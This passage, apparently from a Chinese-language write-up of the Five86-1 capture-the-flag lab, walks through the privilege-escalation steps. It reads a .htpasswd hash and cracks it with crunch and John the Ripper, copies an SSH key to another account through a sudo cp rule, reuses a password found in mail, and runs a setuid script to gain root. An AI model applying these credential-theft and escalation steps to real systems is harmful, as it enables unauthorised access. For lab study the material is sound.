+find: '/etc/webmin/exim': Permission denied
+find: '/etc/webmin/inetd': Permission denied
+find: '/etc/webmin/logrotate': Permission denied
+find: '/etc/webmin/fsdump': Permission denied
+find: '/etc/webmin/openslp': Permission denied
+find: '/etc/webmin/status': Permission denied
+find: '/etc/webmin/firewall6': Permission denied
+find: '/etc/webmin/sshd': Permission denied
+find: '/etc/webmin/samba': Permission denied
+find: '/etc/webmin/bandwidth': Permission denied
+find: '/etc/webmin/lvm': Permission denied
+find: '/etc/webmin/ppp-client': Permission denied
+find: '/etc/webmin/cluster-shell': Permission denied
+find: '/etc/webmin/ldap-client': Permission denied
+find: '/etc/webmin/pam': Permission denied
+find: '/etc/webmin/tunnel': Permission denied
+find: '/etc/webmin/smf': Permission denied
+find: '/etc/webmin/smart-status': Permission denied
+find: '/etc/webmin/init': Permission denied
+find: '/etc/webmin/dhcpd': Permission denied
+find: '/etc/webmin/iscsi-server': Permission denied
+find: '/etc/webmin/xinetd': Permission denied
+find: '/etc/webmin/custom': Permission denied
+find: '/etc/webmin/ldap-server': Permission denied
+find: '/etc/webmin/vgetty': Permission denied
+find: '/etc/webmin/jabber': Permission denied
+find: '/etc/webmin/htaccess-htpasswd': Permission denied
+find: '/etc/webmin/ipfw': Permission denied
+find: '/etc/webmin/phpini': Permission denied
+find: '/etc/webmin/pap': Permission denied
+find: '/etc/webmin/proftpd': Permission denied
+find: '/etc/webmin/proc': Permission denied
+find: '/etc/webmin/shorewall': Permission denied
+find: '/etc/webmin/dovecot': Permission denied
+find: '/etc/webmin/krb5': Permission denied
+find: '/etc/webmin/webalizer': Permission denied
+find: '/etc/webmin/bacula-backup': Permission denied
+find: '/etc/webmin/filemin': Permission denied
+find: '/etc/webmin/stunnel': Permission denied
+find: '/etc/webmin/cluster-cron': Permission denied
+find: '/etc/webmin/webminlog': Permission denied
+find: '/etc/webmin/package-updates': Permission denied
+find: '/etc/webmin/firewalld': Permission denied
+find: '/etc/webmin/net': Permission denied
+find: '/etc/webmin/servers': Permission denied
+find: '/etc/webmin/cluster-usermin': Permission denied
+find: '/etc/webmin/lpadmin': Permission denied
+find: '/etc/webmin/postfix': Permission denied
+find: '/etc/webmin/mon': Permission denied
+find: '/etc/webmin/mysql': Permission denied
+find: '/etc/webmin/man': Permission denied
+find: '/etc/webmin/ajaxterm': Permission denied
+find: '/etc/webmin/usermin': Permission denied
+find: '/etc/webmin/shorewall6': Permission denied
+find: '/etc/webmin/nis': Permission denied
+find: '/etc/webmin/mount': Permission denied
+find: '/etc/webmin/cluster-copy': Permission denied
+find: '/etc/webmin/inittab': Permission denied
+find: '/etc/webmin/backup-config': Permission denied
+find: '/etc/webmin/webmincron': Permission denied
+find: '/etc/webmin/ipsec': Permission denied
+find: '/etc/webmin/pptp-client': Permission denied
+find: '/etc/webmin/pptp-server': Permission denied
+find: '/etc/webmin/useradmin': Permission denied
+find: '/etc/webmin/software': Permission denied
+find: '/etc/webmin/wuftpd': Permission denied
+find: '/etc/webmin/grub': Permission denied
+find: '/etc/webmin/exports': Permission denied
+find: '/etc/webmin/squid': Permission denied
+find: '/etc/webmin/tcpwrappers': Permission denied
+find: '/etc/webmin/cpan': Permission denied
+find: '/etc/webmin/webmin': Permission denied
+find: '/etc/webmin/fail2ban': Permission denied
+find: '/etc/webmin/raid': Permission denied
+find: '/etc/webmin/cluster-passwd': Permission denied
+/tmp/dIlti
+/tmp/report.txt
+/tmp/linuxprivchecker.py
+find: '/sys/kernel/debug': Permission denied
+find: '/sys/fs/pstore': Permission denied
+find: '/sys/fs/bpf': Permission denied
+find: '/home/roy': Permission denied
+find: '/home/douglas': Permission denied
+find: '/home/richmond': Permission denied
+find: '/home/moss': Permission denied
+find: '/home/jen': Permission denied
+
+```
+
+从搜索结果中看到 /var/www/html/reports/.htaccess 是有权限的
+
+![19](https://havocykp.github.io/assets/images/img_blog12/19.png)
+
+查看该文件内容
+
+发现了另一个文件地址
+
+![20](https://havocykp.github.io/assets/images/img_blog12/20.png)
+
+查看 /var/www/.htpasswd
+
+```javascript
+cat /var/www/.htpasswd
+douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1
+```
+
+![21](https://havocykp.github.io/assets/images/img_blog12/21.png)
+
+根据提示，使用crunch工具生成一个由 aefhrt组成的全部十位的密码字典
+
+![22](https://havocykp.github.io/assets/images/img_blog12/22.png)
+
+将得到的账号信息保存用于比较
+
+```javascript
+echo 'douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1' > hash.txt
+```
+
+![23](https://havocykp.github.io/assets/images/img_blog12/23.png)
+
+接着使用 John the ripper（jrt）工具进行比对测试用户密码
+
+fatherrrrr    (douglas)
+
+![24](https://havocykp.github.io/assets/images/img_blog12/24.png)
+
+获取的账号/密码 登录 ssh
+
+![25](https://havocykp.github.io/assets/images/img_blog12/25.png)
+
+sudo -l 查看当前账号的权限
+
+发现jen用户只能使用cp（复制功能）
+
+对于jen这个用户的文件，没有任何读的权限
+
+这里我发现jen其实是允许无密码登录的，也就是可以使用ssh秘钥直接登录到这个账号
+
+![26](https://havocykp.github.io/assets/images/img_blog12/26.png)
+
+但是jen目录下没有 .ssh文件夹，也没有秘钥文件，需要重新生成并把秘钥文件复制到jen用户目录下，且jen用户对Douglas用户文件没有操作权限，所以不能直接复制Douglas的ssh文件，需要把它放到二者都有权限的 /tmp临时目录下
+
+```javascript
+douglas@five86-1:~$ ssh -keygen -b 2048
+Bad escape character 'ygen'.
+douglas@five86-1:~$ ssh-keygen -b 2048
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/douglas/.ssh/id_rsa): 
+/home/douglas/.ssh/id_rsa already exists.
+Overwrite (y/n)? y
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/douglas/.ssh/id_rsa.
+Your public key has been saved in /home/douglas/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:SRHsV14K0iQWf77IO45P36RdGQkvUfzFI2XEuCqchws douglas@five86-1
+The key's randomart image is:
++---[RSA 2048]----+
+|       .*=.   ** |
+|       .o+o .o++o|
+|       ....+.=o +|
+|       ....oo.+ o|
+|        S.o o. + |
+|       E * + .. o|
+|        . B . ...|
+|         +.o = . |
+|        .o+.o o  |
++----[SHA256]-----+
+
+```
+
+![27](https://havocykp.github.io/assets/images/img_blog12/27.png)
+
+复制文件到 /tmp目录
+
+![28](https://havocykp.github.io/assets/images/img_blog12/28.png)
+
+切换到 /tmp，将文件复制到 /hoe/jen/.ssh
+
+![29](https://havocykp.github.io/assets/images/img_blog12/29.png)
+
+ssh连接 jen用户
+
+![30](https://havocykp.github.io/assets/images/img_blog12/30.png)
+
+登录jen后，收到了一封邮件，查看邮件内容
+
+发现邮件里包含了moss用户名和密码 Fire!Fire!
+
+![31](https://havocykp.github.io/assets/images/img_blog12/31.png)
+
+ssh 登录 moss
+
+![32](https://havocykp.github.io/assets/images/img_blog12/32.png)
+
+进入到moss账户，发现隐藏目录 games
+
+![33](https://havocykp.github.io/assets/images/img_blog12/33.png)
+
+查看 .games目录下文件
+
+![34](https://havocykp.github.io/assets/images/img_blog12/34.png)
+
+运行upyourgame脚本
+
+![35](https://havocykp.github.io/assets/images/img_blog12/35.png)
+
+看下id确实是root权限，找到 /root/flag.txt 
+
+![36](https://havocykp.github.io/assets/images/img_blog12/36.png)
